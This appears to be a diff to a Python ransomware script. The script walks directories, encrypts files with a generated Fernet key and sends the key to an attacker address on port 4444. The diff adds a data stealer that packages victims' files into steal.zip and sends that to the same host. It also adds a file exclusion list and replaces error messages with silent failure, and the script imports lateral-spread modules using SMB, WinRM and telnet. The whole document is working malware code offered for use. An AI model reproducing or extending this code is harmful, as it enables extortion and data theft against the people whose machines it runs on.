@@ -1,5 +1,6 @@
 # Author: SergioZ3R0
 #region Imports
+from time import sleep
 imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
 #Install necessary modules
 def install(package): # Install the required package
@@ -22,11 +23,13 @@ import telnetlib
 import winrm
 from smb.SMBConnection import SMBConnection
 import spread
+from stealer import stealer
 #endregion
 #region Definitions
 files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
     global files
+    importantF=["darthvader.py", "decrypt.py", "logo.png", "spread.py", "time_remaining.txt", "window.py", "stealer.py", "auto_run", "encryption_time.txt","README.md","auto_run.cpp","steal.zip"]
     try:
         for file in os.listdir(directory):
             rute_element = os.path.join(directory, file)
@@ -39,12 +42,12 @@ def recorrer_arbol_directorios(directory):
                     recorrer_arbol_directorios(rute_element)
                 else:
                     # Ignora los archivos relacionados con Python
-                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt" or file == "README.md":
+                    if file.endswith('.py') or file.endswith(".deb") or file.endswith(".exe") or file in importantF:
                         continue
                     print("File:", rute_element)
                     files.append(rute_element)
     except Exception as e:
-        print(f"Error finding files: {e}")
+        pass
     print(files)
 
 def send_file_to_host(file_path, host, port): # Send the key file to the attacker
@@ -72,6 +75,10 @@ key = Fernet.generate_key() # Generate a key
 with open("key.key", "wb") as key_file: # Open the key file in write binary mode
     key_file.write(key) # Write the key to the file
 
+#region Stealer
+stealer(files)
+#endregion
+
 # Encrypt the files
 for file in files:
     try:
@@ -95,8 +102,10 @@ unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')
 # Usage: send_file
 try:
     send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
+    sleep(5)
+    send_file_to_host("steal.zip", "192.168.1.137", 4444)
 except:
-    print(f"Error sending file: {e}")
+    pass
 
 
 #Delete the randsomware
